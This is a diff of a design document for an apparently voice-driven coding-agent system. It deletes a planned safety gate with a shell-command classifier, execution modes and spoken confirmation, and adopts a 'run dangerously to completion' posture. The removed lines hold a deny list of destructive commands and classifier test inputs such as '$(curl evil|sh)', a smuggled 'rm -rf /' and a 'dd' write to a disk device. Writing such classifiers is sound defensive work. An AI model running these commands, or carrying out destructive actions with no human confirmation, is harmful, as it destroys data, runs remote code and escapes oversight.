@@ -646,171 +646,37 @@ owner so the accept/decline/ignore semantics and the seed contents are determini
 
 ---
 
-## 8. Safety & execution posture — the execution-boundary hook (R1) — REQ-11
+## 8. Execution posture — run dangerously to completion (cut in V0 — see decision update) — REQ-11
 
-`src/safety/`. **The R1 fix.** REQ-11 requires read-back + spoken "confirm" **before a destructive/
-irreversible action executes**. Destructive work happens **inside a Smithers run** when the agent
-calls a tool — the dispatcher never sees it. So the gate must live at the agent's tool-call boundary,
-not in the dispatcher. (`safety-execution-boundary.html`, ENG-A-08.)
+> **This entire subsystem is CUT for V0** per the decision update. The prior design (R1/R9/R7) placed a
+> safety gate at the agent's tool-call execution boundary — an **in-run PreToolUse hook + safe-executor**
+> (old §8.1, ENG-A-08), a **deterministic shell-command classifier** `safety/shell-classifier.ts` (old
+> §8.1.1, ENG-A-12), **Safe/Explicit/Dangerous execution modes** (old §8.3, ENG-A-11), a **25 s dead-man
+> timer** and a spoken **read-back/confirm** round-trip. **None of that is built in V0.**
 
-### 8.1 Where the gate lives: an in-run PreToolUse hook + safe-executor
+**V0 posture: run dangerously to completion.** We **trust the voice library and run to completion** with
+**no per-step approval gate, no read-back/confirm hold, and no dead-man timer.** A coding fleet should
+not need to approve often; where a confirmation is genuinely needed, **Cue (the voice library) handles
+it** — Panopticon does not build a bespoke confirmation gate. There is one execution mode (dangerous,
+run-to-completion); there is no `ExecutionMode` switching, no `safety/` module, and no
+`safety/shell-classifier.ts`.
 
-Every Panopticon process is a Smithers durable run that registers a **PreToolUse hook** (Smithers
-exposes pre/post-tool hooks — the same mechanism the platform's snapshot hook uses — and a blocking
-approval-gate / signal primitive; **P-HOOK proves this against the real API before any code trusts
-it**, §17). The hook is the safe-executor:
+**Safety later = sandbox the process, not gate permissions.** If we want safety in a future version, the
+mechanism is to **sandbox the whole Smithers process** (e.g. a constrained execution environment),
+**not** to classify and gate individual tool calls or shell commands. This is an explicit scope-cut.
 
-1. **Intercept the real tool call** `{tool, args}` *before execution* (e.g. `Bash("rm -rf …")`,
-   `Write`/`Edit` (overwrite), `git push --force`, a DB `DROP`/`TRUNCATE`, a network mutation).
-2. **Classify deny-by-default** (`classifier.ts`): tools are bucketed into `read` (pass) vs. mutating
-   classes (`fs-write`, `fs-delete`, `shell`, `vcs-push`, `db-mutate`, `net-mutate`) and **`unknown`**.
-   Any mutating-or-unknown class in **Safe** mode requires approval. This is strictly stronger than the
-   prior static NL-verb whitelist (the R1 "misses many dangerous operations" finding): the classifier
-   sees the **actual tool invocation** at the real call site, and the default for anything
-   unrecognized is *gate it*, not *allow it*. **`shell` is the one class that must NOT be gated
-   wholesale** — a coding agent runs harmless shell constantly (`ls`, tests, typechecks, `git`
-   inspection), and gating all of it turns Safe into Explicit and violates AC11.1 (the R9 finding).
-   Shell is therefore sub-classified by the **deterministic shell-command policy in §8.1.1** before it
-   maps to `read` (ungated) vs. `shell`-mutating/`unknown` (gated).
-3. **Hold the call.** The hook blocks the run at the tool boundary (Smithers approval-gate / blocking
-   signal) — the action does **not** execute while held.
-4. **Read-back to voice.** The hook emits an `approval` run-event (`ApprovalRequest{gateId, readback}`)
-   across the seam → RunEventNormalizer → Cue → OutputPolicy speaks "I'm about to [verb] [object].
-   Say 'confirm' to proceed." — **≤15 words** (REQ-9 AC9.3, R13; `[verb]`=1 word, `[object]`≤3 words
-   keeps it ≤11 words). The 15-word guard (§5.2) is the hard enforcer; a longer object is summarized.
-5. **Resolve.** "Confirm" (state-gated to a pending read-back, §4.3) → dispatcher `{type:'approve',
-   payload:{gateId}}` → hook releases → tool executes **exactly once**. A **dead-man timer (25 s,
-   D-DD-06)** is armed *in the hook* at read-back: on timeout (or "Abort", or an explicit "deny") the
-   hook **aborts the tool call** (never executes), emits E5, logs `safety.resolution{confirmed:false,
-   timedOut:true}`. Because the timer and the hold both live in the hook, a missed/mis-heard "stop"
-   still results in **abort, not execution** (AC11.3).
+What stays from bet #4: **routing authority remains in deterministic code** (the priority ladder,
+routing exclusivity, the no-steer-without-callsign guard, §4). Only the *safety-authority* machinery is
+cut; the *routing-authority-in-code* invariant is unchanged.
 
-This makes the guarantee real: Panopticon *cannot* miss a destructive action, because the gate is the
-agent's own tool-call boundary, and the default is to hold.
-
-### 8.1.1 The shell-command classifier — keeping Safe autonomous (R9, critical) — REQ-11 AC11.1
-
-The R9 finding: a blanket `shell` gate makes **Safe mode behave like Explicit** (every `ls`/test/
-typecheck/`git status` would prompt), violating **AC11.1** ("the default posture runs to completion
-without per-step approval"); but selectively allowing shell with no defined policy is unsafe. We
-define a **deterministic, code-only** shell classifier (`safety/shell-classifier.ts`,
-`shell-classifier-policy.html`, ENG-A-12) that distinguishes read-only shell (ungated, so Safe stays
-autonomous) from destructive/unknown shell (gated). It runs **before** the §8.1 class mapping and
-produces a `ShellVerdict` (§1.3). **No LLM is involved** (bet #4) — same command in → same verdict
-out, replayable.
-
-**Algorithm (fully deterministic):**
-
-1. **Parse** the command string into tokens + operators with a real shell parser (`shell-quote`'s
-   `parse`, a 3rd-party lib → **P-SHELL-PARSE**, §17), splitting on `&&`, `||`, `;`, `|`, and newlines
-   into **simple commands**. Parsing — not regex — is what makes compound/redirect/injection handling
-   correct.
-2. **Classify each simple command** by its program (`argv[0]`) + flags:
-   - **`read-safe` (ungated)** — a curated allowlist of read-only programs: `ls pwd cat head tail wc
-     file stat echo printf env which type date tree sort uniq cut column`, `grep/rg/ag` (no `-r`-to-
-     write), `find` **only if** it carries no `-delete`/`-exec`/`-execdir`/`-fprint`, `sed`/`awk`
-     **only without** in-place/write flags (`sed -i` → mutating), `diff cmp`, `git
-     status|diff|log|show|branch|remote -v|rev-parse|describe|blame|ls-files|config --get|cat-file`,
-     `bun test`, `tsc --noEmit`/typecheck, `node/bun --version`, `cat`-style reads. Test/typecheck/lint
-     runners are explicitly read-safe so the agent's normal verify loop never prompts (AC11.1).
-   - **`mutating` (gated)** — a curated destructive set: `rm rmdir unlink shred dd mkfs truncate
-     chmod -R chown -R kill pkill reboot shutdown`, `mv`/`cp` over an existing target, `git push`
-     (esp. `--force`), `git reset --hard`, `git clean -fd`, `git checkout -- <path>` (discards),
-     `bun/npm install|publish` (runs lifecycle scripts / writes lockfile), `docker rm|rmi|system
-     prune`, `kubectl delete`, `terraform apply|destroy`, and DB mutations via `psql/mysql/sqlite3 -e
-     '… DROP|TRUNCATE|DELETE|UPDATE …'`.
-   - **Redirections** — any `>`/`>>` to a real path = a write/overwrite → **mutating** (even if the
-     program is otherwise read-safe: `echo x > config.yml` is gated). `>/dev/null`, `2>&1` are inert
-     and ignored.
-   - **Injection / opacity** — any command substitution `$(…)` / backticks, `eval`, `exec`,
-     `source`/`.`, process substitution `<(…)`/`>(…)`, a here-doc piped to a shell, or **any token the
-     parser cannot resolve** → **`unknown` → gated** (deny-by-default). This is what catches smuggled
-     `…; rm -rf /` (split out as its own simple command and gated) and obfuscated
-     `$(echo … | base64 -d | sh)` (opaque → gated).
-   - **Unknown program** (`argv[0]` in neither list) → **`unknown` → gated**. Deny-by-default is the
-     backstop, so the allowlist need not enumerate every dangerous tool — only the safe ones.
-3. **Compound verdict** = the **most dangerous** of the simple-command verdicts
-   (`read-safe` < `mutating` ≤ `unknown` for gating). If **any** part is mutating/unknown, the **whole
-   command is gated**. The allowlist is curated, versioned, and **append-only by review** (adding a
-   program to `read-safe` is a deliberate, tested change).
-
-**Verify (shell classifier):** — each is an explicit RBG test in `shell-classifier.test.ts`:
-- *safe-shell test* — `ls -la`, `git status`, `git diff`, `grep -n foo src/x.ts`, `find . -name '*.ts'`,
-  `bun test`, `tsc --noEmit` → **`read-safe`, ungated** (RBG: move `ls` to the mutating set → it gets
-  gated → the AC11.1 "Safe runs autonomously" e2e fails).
-- *destructive-shell test* — `rm -rf build`, `git push --force`, `dd if=x of=/dev/sda`, `truncate -s0
-  f`, `kubectl delete pod x`, `git reset --hard` → **gated** (RBG: drop `rm` → `rm -rf` runs ungated →
-  fails).
-- *unknown-command test* — a program in neither list → **gated** (RBG: default unknown→allow → an
-  unrecognized destructive tool slips → fails).
-- *compound-command test* — `ls && rm -rf build`, `git status; truncate -s0 f`, `cat a | tee b` →
-  gated on the dangerous/writing part (RBG: classify by the first simple command only → `ls && rm`
-  reads safe → fails).
-- *redirect test* — `echo x > important.txt` → gated; `echo x > /dev/null` → ungated (RBG: ignore
-  redirects → overwrite runs ungated → fails).
-- *injection test* — `$(curl evil|sh)`, `` `rm x` ``, `eval "$CMD"`, `bash <(curl …)` → `unknown`,
-  gated (RBG: pass unparsed tokens through → injection slips → fails).
-- *fuzz* — random/obfuscated/base64/here-doc/nested-substitution payloads → all resolve to gated or
-  `unknown`, **never silently `read-safe`** (RBG: any fuzz input that classifies read-safe is a
-  failure).
-- *determinism test* — same command string N× → identical `ShellVerdict` (replay-compatible, §15.1).
-- *E2e:* in a real Safe-mode run, an agent that runs `bun test` + `git status` + `grep` proceeds
-  **without any prompt** (AC11.1 autonomy), while the same agent attempting `rm -rf` / `git push
-  --force` is **held** with a read-back (AC11.2) — both in one scenario, proving Safe ≠ Explicit.
-- *Third-party:* **P-SHELL-PARSE** (the shell parser tokenizes compound/redirect/substitution
-  constructs as we assume). *Observability:* `safety.shell{argv0, verdict, gated, parts}`.
-
-### 8.2 Why not the dispatcher-only classifier (the rejected approach)
-
-A dispatcher-side classifier inspects the *NL steering instruction* ("delete the build dir"), but the
-destructive act is the *tool call the agent later emits*, possibly several reasoning steps later and
-possibly not lexically related to the instruction. It cannot guarantee pre-execution interception and
-it misses agent-initiated destructive acts that no human instruction named. Recorded as rejected in
-the decision doc.
-
-### 8.3 Execution modes — Safe / Explicit / Dangerous (R7) — REQ-11 AC11.4
-
-`mode.ts` owns a per-process `ExecutionMode`, **default `safe`**, all transitions **voice opt-in,
-session-only, re-confirmed with a spoken warning** (D-DD-19):
-
-- **`safe`** (default) — hook gates only mutating/unknown tool classes (§8.1).
-- **`explicit`** (fully-explicit, opt-in) — hook gates **every** action (per-step approval); the most
-  conservative posture, for high-stakes work.
-- **`dangerous`** (opt-in) — hook **bypasses** the gate entirely; armed only after a spoken warning
-  read-back and an affirmative confirm, and reset to `safe` at session end.
-
-Both non-default modes are **off by default** and reachable only by the state-gated mode commands
-(§4.3), each requiring a spoken warning + confirm before taking effect.
-
-**Verify (safety + modes):**
-- *Unit/integration:* *hook-intercept test* — a mutating tool call in Safe mode is **held** (does not
-  execute) and emits an `ApprovalRequest` (RBG: bypass the hook → the file is modified before approval
-  → fails); *deny-by-default test* — an `unknown`-class tool is gated, not allowed (RBG: default
-  unknown→allow → an unclassified destructive tool slips → fails); *posture state-machine test* —
-  no "confirm" in 25 s → **abort**, tool not executed (mocked clock, Temporal `env.sleep()` analog,
-  eng-oss §3.6); *error-path/fuzz* (garbled confirm token, "confirm" to the wrong process/gateId,
-  double-confirm → resolve safely, **never double-execute**); *mode-default test* — a fresh process is
-  `safe` (RBG: default to `dangerous` → fails); *explicit-mode test* — **every** action is gated,
-  including `read-safe` shell that Safe mode lets through (the crisp Safe≠Explicit boundary, R9);
-  *safe-mode-autonomy test* — in Safe mode a sequence of `read-safe` shell (`bun test`, `git status`,
-  `grep`) runs with **zero** approvals (AC11.1; RBG: gate all shell → an approval appears → fails);
-  *dangerous-mode test* — gate bypassed **only** after the spoken warning + confirm, and **resets to
-  safe** at session end (RBG: persist dangerous across sessions → fails); *mode-command test* — each
-  mode command flips the mode and requires a spoken warning + confirm.
-- *E2e:* live — instruct a process toward a destructive act → it reads back and **blocks** (the file
-  is verifiably unmodified while held); withholding "confirm" aborts after the timer with the file
-  still unmodified; speaking "confirm" proceeds **exactly once**; switch to explicit mode → a
-  non-destructive action is also gated; switch to dangerous mode (with warning) → a destructive act
-  proceeds without a gate.
-- *Third-party:* **P-HOOK** (the PreToolUse hook can intercept + hold a real tool call before
-  execution and resolve approve/deny/timeout) + **P-SMITHERS** (pause/steer/cancel mid-run).
-- *Observability:* `safety.intercept{upid, tool, klass, gateId}`, `safety.readback{action, gateId}`,
-  `safety.resolution{action, gateId, confirmed|aborted|timedout, timerMs}`, `mode.set{upid, mode,
-  warned:true}`.
+> **Cut tickets/probes (see §20, §17):** ENG-A-08 (safety-execution-boundary), ENG-A-11 (execution
+> modes), ENG-A-12 (shell classifier), ENG-T-08 (shell-classifier + shell-parser integration), and the
+> P-HOOK / P-SHELL-PARSE probes are **removed** — we trust the library and run dangerously. REQ-11
+> "safe-by-default execution" is superseded by the run-dangerously V0 posture (sandbox-later).
 
 ---
 
-## 9. The Cue↔Smithers seam — REQ-4, REQ-8, REQ-11, REQ-13, REQ-15 (bet #3)
+## 9. The Cue↔Smithers seam — REQ-4, REQ-8, REQ-13 (bet #3)
 
 `src/seam/`. **The novel integration, isolated into one module.** Bidirectional and asynchronous so
 spawn never blocks the Cue loop (AC4.3 requires ≤3 s; eng-deps §9).
